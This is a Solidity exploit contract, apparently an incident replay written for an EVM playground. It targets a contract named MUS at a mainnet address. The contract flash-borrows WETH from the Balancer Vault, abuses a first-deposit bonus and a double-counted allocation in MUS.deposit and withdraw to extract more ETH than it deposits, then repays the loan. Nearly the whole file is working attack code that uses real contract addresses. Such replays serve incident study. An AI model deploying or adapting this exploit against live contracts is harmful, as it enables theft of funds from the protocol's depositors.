// SPDX-License-Identifier: UNLICENSED
// Cleaned for EVM Playground recorder (plain @ethereumjs/vm, no forge Test/cheats).
// State preloaded from anvil_state (MUS victim, WETH, Balancer Vault present) at the
// exact pre-tx-138 snapshot of block 26087602 (the "pack" round already funded).
// Deployed fresh (normal CREATE) as the attacker — a FRESH depositor, exactly what
// MUS.deposit()'s first-deposit bonus requires. One deposit->withdraw cycle nets ETH.
pragma solidity ^0.8.10;

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
    function transfer(address, uint256) external returns (bool);
    function withdraw(uint256) external; // WETH unwrap
    function deposit() external payable; // WETH wrap
}

interface IMUS {
    function deposit() external payable;
    function withdraw(uint256 pid, uint256 amount, bool withdrawRewards) external;
    function balanceOf(address) external view returns (uint256);
}

interface IBalancerVault {
    function flashLoan(
        address recipient,
        address[] calldata tokens,
        uint256[] calldata amounts,
        bytes calldata userData
    ) external;
}

contract MUSExploit {
    event log_named_decimal_uint(string key, uint256 val, uint8 dec);

    IMUS constant MUS = IMUS(0x9bDF81e6066D32764b7E75a1b5577237e06d9364);
    IERC20 constant WETH = IERC20(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IBalancerVault constant VAULT = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);

    uint256 constant DEPOSIT = 53_355_703_172210117028; // real cycle-1 deposit amount (wei)

    function testExploit() external {
        // Flash-borrow the working capital (WETH) from Balancer (0 fee); cycle runs in callback.
        address[] memory tokens = new address[](1);
        tokens[0] = address(WETH);
        uint256[] memory amounts = new uint256[](1);
        amounts[0] = DEPOSIT;
        VAULT.flashLoan(address(this), tokens, amounts, "");

        emit log_named_decimal_uint("net ETH extracted (one cycle)", address(this).balance, 18);
    }

    function receiveFlashLoan(
        address[] calldata,
        uint256[] calldata amounts,
        uint256[] calldata,
        bytes calldata
    ) external {
        require(msg.sender == address(VAULT), "only vault");
        WETH.withdraw(amounts[0]); // unwrap to ETH

        // --- one exploit cycle from this fresh address ---
        uint256 before = address(this).balance; // == DEPOSIT (borrowed)
        MUS.deposit{value: DEPOSIT}(); // pays bonus refund R back to us here AND mints a MUS allocation
        uint256 minted = MUS.balanceOf(address(this)); // the double-counted allocation
        MUS.withdraw(0, minted, true); // redeems it for ETH (W), uncapped vs D
        uint256 got = address(this).balance; // == before + R + W - D  (net > before)
        require(got > before, "cycle did not net a profit");

        // Repay the flash loan (Balancer fee is 0): rewrap DEPOSIT ETH and return it.
        WETH.deposit{value: DEPOSIT}();
        WETH.transfer(address(VAULT), amounts[0]);
    }

    receive() external payable {}
}
